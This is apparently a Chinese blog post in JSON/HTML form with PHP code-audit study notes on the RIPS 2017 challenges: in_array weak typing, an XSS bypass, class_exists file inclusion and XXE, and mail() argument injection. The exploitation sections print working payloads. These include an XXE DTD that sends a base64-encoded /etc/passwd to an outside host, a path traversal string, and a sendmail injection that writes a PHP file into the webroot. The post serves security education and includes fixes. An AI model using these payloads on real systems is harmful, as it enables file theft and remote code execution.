可以用来重新配置sendmail选项 -X可以指定日志文件位置</span></span><br></pre></td></tr></table></figure></p>\n<p> 之前PHPMailer漏洞CVE-2016-10033就是这样发现的，影响到了包括像Wordpress这样广泛使用的程序。</p>\n<p> 说完<code>mail()</code>函数继续来分析源码，源码中第17行<code>$data[&#39;from&#39;]</code>为用户可控，并且传入到了第31行<code>mail()</code>函数中的第5参数中。虽然使用了<code>sanitize</code>函数进行过滤，<code>sanitize</code>函数首先调用了<code>FILTER_VALIDATE_EMAIL</code>过滤器验证传入值是否为有效的电子邮件地址，然后使用了<code>escapeshellarg</code>函数对返回值进行了转码过滤。</p>\n<p>首先讨论一下<code>FILTER_VALIDATE_EMAIL</code>这个过滤器，这个过滤器仅仅是以RFC822规则验证邮箱地址是否有效正确，但是并不会验证其安全性。附各PHP版本下绕过<code>FILTER_VALIDATE_EMAIL</code>的运行情况。可以看到在&gt;=5.2.0版本<code>fliter_var()</code>函数才被添加，其中某些版本会返回<strong>false</strong>，所以测试中需要注意版本。</p>\n<p><img src=\"/2018/08/06/php-code-review/FILTER_VALIDATE_EMAIL.jpg\" alt=\"FILTER_VALIDATE_EMAIL\"></p>\n<p>然后我们绕过<code>FILTER_VALIDATE_EMAIL</code>的情况下还需要绕过<code>escapeshellarg（）</code>和<code>escapeshellcmd（）</code>，先看一下PHP文档对这两个函数的描述。</p>\n<blockquote>\n<p><strong>escapeshellarg</strong></p>\n<p>(PHP 4 &gt;= 4.0.3, PHP 5, PHP 7)</p>\n<p>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</p>\n<p><strong>说明</strong> </p>\n<p>string escapeshellarg ( string $arg )</p>\n<p>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。</p>\n</blockquote>\n<blockquote>\n<p><strong>escapeshellcmd</strong></p>\n<p>(PHP 4, PHP 5, PHP 7)</p>\n<p>escapeshellcmd — shell 元字符转义</p>\n<p><strong>说明</strong></p>\n<p>string escapeshellcmd ( string $command )</p>\n<p>escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</p>\n<p>反斜线（\\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$\\, \\x0A 和 \\xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</p>\n</blockquote>\n<p>可以看到<code>escapeshellarg（）</code>和底层的<code>escapeshellcmd（）</code>是用来保护系安全，防止代码注入的转义函数。但是<code>escapeshellarg（）</code>和<code>escapeshellcmd（）</code>一起使用的话并不安全。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$a=escapeshellarg(<span class=\"string\">\"172.17.0.2' -v -d a=1\"</span>);</span><br><span class=\"line\">$b=escapeshellcmd(<span class=\"string\">\"172.17.0.2' -v -d a=1\"</span>);</span><br><span class=\"line\">$c=escapeshellcmd(escapeshellarg(<span class=\"string\">\"172.17.0.2' -v -d a=1\"</span>));</span><br><span class=\"line\">var_dump($a).PHP_EOL;</span><br><span class=\"line\">var_dump($b).PHP_EOL;</span><br><span class=\"line\">var_dump($c).PHP_EOL;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>如上我们使用<code>172.17.0.2&#39; -v -d a=1</code>这样的payload来进行测试。<br>测试结果如下<br><img src=\"/2018/08/06/php-code-review/escape.jpg\" alt=\"ESCAPE\"><br>可以看到在第1、2、4种输出中，<code>escapeshellcmd(escapeshellarg(&quot;172.17.0.2&#39; -v -d a=1&quot;))</code>的输出为<code>string(28) &quot;&#39;172.17.0.2&#39;\\\\&#39;&#39; -v -d a=1\\&#39;&quot;</code><br>详细分析一下：</p>\n<ol>\n<li>传入的参数是：<code>172.17.0.2&#39; -v -d a=1</code>。</li>\n<li>经过escapeshellarg处理后变成了<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d</code>a=1’，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li>\n<li>经过escapeshellcmd处理后变成<code>&#39;172.17.0.2&#39;\\\\&#39;&#39; -v -d a=1\\&#39;</code>，这是因为escapeshellcmd对<code>\\</code>以及最后那个没有配对的<code>&#39;</code>进行了转义，而忽略对之前两对匹配了的<code>&#39;</code>进行转意。</li>\n<li>最后执行的命令是<code>&#39;curl 172.17.0.2&#39;\\\\&#39;&#39; -v -d a=1\\&#39;</code>，由于中间的<code>\\\\</code>被解释为<code>\\</code>而不再是转义字符，所以后面的<code>&#39;</code>没有被转义，与再后面的<code>&#39;</code>配对儿成了一个空白连接符。所以可以简化为<code>curl 172.17.0.2\\ -v -d a=1&#39;</code>，即向<code>172.17.0.2\\</code>发起请求，<strong>POST</strong> 数据为<code>a=1&#39;</code>。</li>\n</ol>\n<p>此处分析学习自<a href=\"https://paper.seebug.org/164/\" title=\"PHP escapeshellarg()+escapeshellcmd() 之殇\" target=\"_blank\" rel=\"noopener\">https://paper.seebug.org/164/</a></p>\n<h3 id=\"利用-4\"><a href=\"#利用-4\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>最终传入<code>mail()</code>函数的第5参数的payload大概为<code>a&quot;&#39;(\\ -OQueueDirectory=/tmp\\ -X/var/www/html/test.php\\ )&quot;@a.com</code>,在执行时变成了<code>&#39;-fa&quot;&#39;\\\\&#39;&#39;\\( -OQueueDirectory=/tmp -X/var/www/html/test.php \\)&quot;@a.com\\&#39;</code>，如上面的分析<code>-f</code>为MTA预设参数，<code>&#39;-fa&quot;\\\\&#39;&#39;&#39;\\(</code>为第一部分，转义后运行时相当于<code>-fa&quot;\\(</code>,这部分作用就是将<code>-f</code>参数闭合造成后续payload逃逸形成注入；<code>-OQueueDirectory=/tmp</code>为第二部分可操作恶意内容，<code>-X/var/www/html/test.php</code>为第三部分可操作恶意内容，<code>\\)&quot;@a.com\\&#39;</code>为绕过<code>FILTER_VALIDATE_EMAIL</code>过滤的必须部分。这样结合起来就完成了注入，但是由于邮箱格式要求以及转义过多，真实进行测试时会带有很多<code>&quot;`</code>`<code>&#39;</code>符号，还需要多多调整来进行测试。</p>\n<h3 id=\"修复-4\"><a href=\"#修复-4\" class=\"headerlink\" title=\"修复\"></a>修复</h3><p><strong>PHPmailer</strong>官方的修复方案是，对用户传参的输入进行检测，如果有转义字符就不传递第5参数，也不会造成注入。<br>所以总结一下核心问题还是<code>escapeshellarg()</code>→<code>escapeshellcmd()</code>这一过程会出现重复转义造成的漏洞。</p>\n<hr>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"#\"></a>#</h2>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"PHP代码审计学习\"><a href=\"#PHP代码审计学习\" class=\"headerlink\" title=\"PHP代码审计学习\"></a>PHP代码审计学习</h1><hr>\n<p>项目来源：<a href=\"https://www.ripstech.com/php-security-calendar-2017/\" target=\"_blank\" rel=\"noopener\">https://www.ripstech.com/php-security-calendar-2017/</a></p>\n<h2 id=\"in-array-函数误用\"><a href=\"#in-array-函数误用\" class=\"headerlink\" title=\"in_array()函数误用\"></a>in_array()函数误用</h2><h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Challenge</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> UPLOAD_DIRECTORY = <span class=\"string\">'./solutions/'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $file;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $whitelist;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($file)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;file = $file;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;whitelist = range(<span class=\"number\">1</span>, <span class=\"number\">24</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (in_array(<span class=\"keyword\">$this</span>-&gt;file[<span class=\"string\">'name'</span>], <span class=\"keyword\">$this</span>-&gt;whitelist)) &#123;</span><br><span class=\"line\">            move_uploaded_file(</span><br><span class=\"line\">                <span class=\"keyword\">$this</span>-&gt;file[<span class=\"string\">'tmp_name'</span>],</span><br><span class=\"line\">                <span class=\"keyword\">self</span>::UPLOAD_DIRECTORY . <span class=\"keyword\">$this</span>-&gt;file[<span class=\"string\">'name'</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$challenge = <span class=\"keyword\">new</span> Challenge($_FILES[<span class=\"string\">'solution'</span>]);</span><br></pre></td></tr></table></figure>\n<p>出现问题的源代码如上，使用<code>in_array()</code>函数检查匹配<code>file[&#39;name&#39;]</code>是否在<code>whitelist</code>中，但忽略了<code>in_array()</code>函数中未设置强匹配参数，导致了弱类型问题。</p>\n<p>phpmanual中对in_array的参数解释如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</span><br><span class=\"line\"></span><br><span class=\"line\">//大海捞针，在大海（haystack）中搜索针（ needle），如果没有设置 strict 则使用宽松的比较。</span><br><span class=\"line\"></span><br><span class=\"line\">//strict</span><br><span class=\"line\">如果第三个参数 strict 的值为 TRUE 则 in_array() 函数还会检查 needle 的类型是否和 haystack 中的相同。</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>其实就是php弱类型的利用，程序员编写时由于不严谨认为输入一定会是int整型数据，我们输入str字符型数据然后利用php的弱类型特点即可。</p>\n<p>弱类型的规律举例如下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$array = array(</span><br><span class=\"line\">    &apos;egg&apos; =&gt; true,</span><br><span class=\"line\">    &apos;cheese&apos; =&gt; false,</span><br><span class=\"line\">    &apos;hair&apos; =&gt; 765,</span><br><span class=\"line\">    &apos;goblins&apos; =&gt; null,</span><br><span class=\"line\">    &apos;ogres&apos; =&gt; &apos;no ogres allowed in this array&apos;</span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\">// Loose checking -- return values are in comments</span><br><span class=\"line\"></span><br><span class=\"line\">// First three make sense, last four do not</span><br><span class=\"line\"></span><br><span class=\"line\">var_dump(in_array(null, $array)); // true</span><br><span class=\"line\">var_dump(in_array(false, $array)); // true</span><br><span class=\"line\">var_dump(in_array(765, $array)); // true</span><br><span class=\"line\">var_dump(in_array(763, $array)); // true</span><br><span class=\"line\">var_dump(in_array(&apos;egg&apos;, $array)); // true</span><br><span class=\"line\">var_dump(in_array(&apos;hhh&apos;, $array)); // true</span><br><span class=\"line\">var_dump(in_array(array(), $array)); // true</span><br><span class=\"line\"></span><br><span class=\"line\">// Strict checking</span><br><span class=\"line\">var_dump(in_array(null, $array, true)); // true</span><br><span class=\"line\">var_dump(in_array(false, $array, true)); // true</span><br><span class=\"line\">var_dump(in_array(765, $array, true)); // true</span><br><span class=\"line\">var_dump(in_array(763, $array, true)); // false</span><br><span class=\"line\">var_dump(in_array(&apos;egg&apos;, $array, true)); // false</span><br><span class=\"line\">var_dump(in_array(&apos;hhh&apos;, $array, true)); // false</span><br><span class=\"line\">var_dump(in_array(array(), $array, true)); // false</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"修复\"><a href=\"#修复\" class=\"headerlink\" title=\"修复\"></a>修复</h3><p>使用<code>===</code>强匹配或<code>in_array()</code>函数加上第三个参数<code>$strict=ture</code></p>\n<hr>\n<h2 id=\"一个XSS过滤绕过trick\"><a href=\"#一个XSS过滤绕过trick\" class=\"headerlink\" title=\"一个XSS过滤绕过trick\"></a>一个XSS过滤绕过trick</h2><h3 id=\"分析-1\"><a href=\"#分析-1\" class=\"headerlink\" title=\"分析\"></a>分析</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// composer require \"twig/twig\"</span></span><br><span class=\"line\"><span class=\"keyword\">require</span> <span class=\"string\">'vendor/autoload.php'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Template</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $twig;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        $indexTemplate = <span class=\"string\">'&lt;img '</span> .</span><br><span class=\"line\">            <span class=\"string\">'src=\"https://loremflickr.com/320/240\"&gt;'</span> .</span><br><span class=\"line\">            <span class=\"string\">'&lt;a href=\"&#123;&#123;link|escape&#125;&#125;\"&gt;Next slide »&lt;/a&gt;'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Default twig setup, simulate loading</span></span><br><span class=\"line\">        <span class=\"comment\">// index.html file from disk</span></span><br><span class=\"line\">        $loader = <span class=\"keyword\">new</span> Twig\\Loader\\ArrayLoader([</span><br><span class=\"line\">            <span class=\"string\">'index.html'</span> =&gt; $indexTemplate</span><br><span class=\"line\">        ]);</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;twig = <span class=\"keyword\">new</span> Twig\\Environment($loader);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getNexSlideUrl</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        $nextSlide = $_GET[<span class=\"string\">'nextSlide'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">return</span> filter_var($nextSlide, FILTER_VALIDATE_URL);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;twig-&gt;render(</span><br><span class=\"line\">            <span class=\"string\">'index.html'</span>,</span><br><span class=\"line\">            [<span class=\"string\">'link'</span> =&gt; <span class=\"keyword\">$this</span>-&gt;getNexSlideUrl()]</span><br><span class=\"line\">        );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">(<span class=\"keyword\">new</span> Template())-&gt;render();</span><br></pre></td></tr></table></figure>\n<p>以php的一个模版引擎twig为例，对url进行XSS安全过滤，其中<code>escape</code>和<code>FILTER_VALIDATE_URL</code>进行了两次过滤转换。</p>\n<p>第一次在第10行，<code>escape</code>过滤，使用的是php自带的<code>htmlspecialchars</code>函数</p>\n<blockquote>\n<p>htmlspecialchars<br>(PHP 4, PHP 5, PHP 7)<br>htmlspecialchars — 将特殊字符转换为 HTML 实体</p>\n<figure class=\"highlight plain\"><figcaption><span>(& 符号)  </span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot; (双引号)  ===============  &amp;quot;</span><br><span class=\"line\">&apos; (单引号)  ===============  &amp;apos;</span><br><span class=\"line\">&lt; (小于号)  ===============  &amp;lt;</span><br><span class=\"line\">&gt; (大于号)  ===============  &amp;gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p>第二次过滤在22行，使用filter_var函数用<code>FILTER_VALIDATE_URL</code>过滤器对<code>$nextSlide</code>变量进行过滤。检查是否是合法的url。</p>\n<h3 id=\"利用-1\"><a href=\"#利用-1\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>可以看到代码对XSS常用的”‘&lt;&gt;符号进行了过滤，但我们可以利用<code>%0a</code>换行符的trick来逃逸过滤，可以通过以下payload执行，首先引入<code>javascript:</code>协议，然后利用javascript中<code>//</code>代表单行注释，而<code>%250a</code>经过一次urldecode变成<code>%0a</code>换行符，成功逃逸出注释行，从而进入<code>echo</code>函数中形成XSS。<br><code>?nextSlide=javascript://comment%250aalert(1)</code></p>\n<p><strong>稍微总结一下常规bypass思路，试敏感关键函数和敏感符号→试编码或注释符号等混淆方法→试伪协议。</strong></p>\n<h3 id=\"修复-1\"><a href=\"#修复-1\" class=\"headerlink\" title=\"修复\"></a>修复</h3><p>针对XSS敏感关键词进行黑名单过滤</p>\n<hr>\n<h2 id=\"class-exists函数和实例化可控导致的XXE漏洞\"><a href=\"#class-exists函数和实例化可控导致的XXE漏洞\" class=\"headerlink\" title=\"class_exists函数和实例化可控导致的XXE漏洞\"></a>class_exists函数和实例化可控导致的XXE漏洞</h2><h3 id=\"分析-2\"><a href=\"#分析-2\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>代码如下<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__autoload</span><span class=\"params\">($className)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">include</span> $className;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$controllerName = $_GET[<span class=\"string\">'c'</span>];</span><br><span class=\"line\">$data = $_GET[<span class=\"string\">'d'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (class_exists($controllerName)) &#123;</span><br><span class=\"line\">    $controller = <span class=\"keyword\">new</span> $controllerName($data[<span class=\"string\">'t'</span>], $data[<span class=\"string\">'v'</span>]);</span><br><span class=\"line\">    $controller-&gt;render();</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'There is no page with this name'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">HomeController</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $template;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $variables;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($template, $variables)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;template = $template;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;variables = $variables;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;variables[<span class=\"string\">'new'</span>]) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">'controller rendering new response'</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">'controller rendering old response'</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这段代码中有两个安全漏洞。第8行中调用class_exists（）会触发文件包含漏洞。<br>PHP文档中对于<code>class_exist</code>函数的解释如下</p>\n<blockquote>\n<p><strong>class_exists</strong> </p>\n<p>(PHP 4, PHP 5, PHP 7)</p>\n<p>class_exists — 检查类是否已定义</p>\n<p>说明 </p>\n<p>bool class_exists ( string $class_name [, bool $autoload = true ] )检查指定的类是否已定义。</p>\n<p>参数 </p>\n<p>class_name</p>\n<p>类名。名字的匹配是不分区大小写的。</p>\n<p>autoload</p>\n<p>是否默认调用 __autoload。</p>\n</blockquote>\n<p>可知<code>class_exist</code>函数默认调用<code>__autoload</code>函数，其中调用了<code>include</code>函数，会造成文件包含漏洞。可以使用路径穿越来包含任意文件，但是使用像这样的<code>../../../../etc/passwd</code>路径穿越符号的前提是PHP版本在5~5.3(包含5.3)版本之间才可以。<br>但是第二个漏洞仍然适用于当前的PHP版本。在以下几行:<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$controllerName = $_GET[<span class=\"string\">'c'</span>]; <span class=\"comment\">//这里$controllerName可控</span></span><br><span class=\"line\">$data = $_GET[<span class=\"string\">'d'</span>];           <span class=\"comment\">//这里$data可控  </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (class_exists($controllerName)) &#123;</span><br><span class=\"line\">    $controller = <span class=\"keyword\">new</span> $controllerName($data[<span class=\"string\">'t'</span>], $data[<span class=\"string\">'v'</span>]);</span><br><span class=\"line\"><span class=\"comment\">//这里使用可控的变量实例化了一个对象，而对象的名称及内容均可控。</span></span><br></pre></td></tr></table></figure></p>\n<p>这样的话，恶意的payload便可以控制实例化过程，任意构造函数，即使代码库本身没有易受攻击的函数。也可以使用PHP内置的SimpleXMLElement函数来进行XXE攻击，进行文件读取操作等行为。</p>\n<h3 id=\"利用-2\"><a href=\"#利用-2\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p> 1.文件包含漏洞<br> 令<code>class_exist</code>函数传入形如<code>../../../../etc/passwd</code>的payload即可；</p>\n<p> 2.实例化SimpleXMLElement进行XXE攻击，查看php手册，SimpleXMLElement构造函数说明如下：</p>\n<blockquote>\n<p><strong>SimpleXMLElement::__construct</strong></p>\n<p>(PHP 5, PHP 7)</p>\n<p>SimpleXMLElement::__construct — Creates a new SimpleXMLElement object</p>\n<p><strong>说明</strong><br>final public SimpleXMLElement::__construct ( string $data [, int $options = 0 [, bool $data_is_url = FALSE [, string $ns = “” [, bool $is_prefix = FALSE ]]]] )</p>\n<p>创建一个新的SimpleXMLElement对象。</p>\n<p>参数 </p>\n<p>data</p>\n<p>格式良好的XML字符串或XML文档的路径或URL（如果 data_is_url是）TRUE。</p>\n<p>options<br>可选地用于指定其他Libxml参数。</p>\n<p>注意：<br>可能需要传递LIBXML_PARSEHUGE 以能够处理深度嵌套的XML或非常大的文本节点。</p>\n<p>data_is_url</p>\n<p>默认情况下data_is_url是FALSE。使用TRUE指定data的路径或URL到一个XML文件，而不是字符串数据。</p>\n<p>ns<br>命名空间前缀或URI。<br>is_prefix<br>TRUE如果ns是前缀，FALSE如果是URI; 默认为FALSE。</p>\n</blockquote>\n<p> 所以构造形如<code>{&quot;SimpleXMLElement&quot;:{&quot;data&quot;:&quot;http://localhost/xxe.xml&quot;,&quot;options&quot;:2,&quot;data_is_url&quot;:1,&quot;ns&quot;:&quot;&quot;,&quot;is_prefix&quot;:0}}</code>其中SimpleXMLElement为实例化函数名，后续payload为SimpleXMLElement构造函数的内容，xxe.xml为XML实体文件。XML实体文件写法可以参考<a href=\"http://www.4o4notfound.org/index.php/archives/29/#pingback-28\" target=\"_blank\" rel=\"noopener\">XXE漏洞分析 from 404 Not Found</a>这里就不多做探讨。</p>\n<p> 举一个例子:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE r [</span><br><span class=\"line\">&lt;!ELEMENT r ANY &gt;</span><br><span class=\"line\">&lt;!ENTITY % sp SYSTEM &quot;http://1.3.3.7:8000/xxe.dtd&quot;&gt;</span><br><span class=\"line\">%sp;</span><br><span class=\"line\">%param1;</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;r&gt;&amp;exfil;&lt;/r&gt;</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % data SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;      //这里使用base64编码是起读取文件时不丢失一些特殊符号的作用</span><br><span class=\"line\">&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &apos;http://1.3.3.7:8000/?%data;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"修复-2\"><a href=\"#修复-2\" class=\"headerlink\" 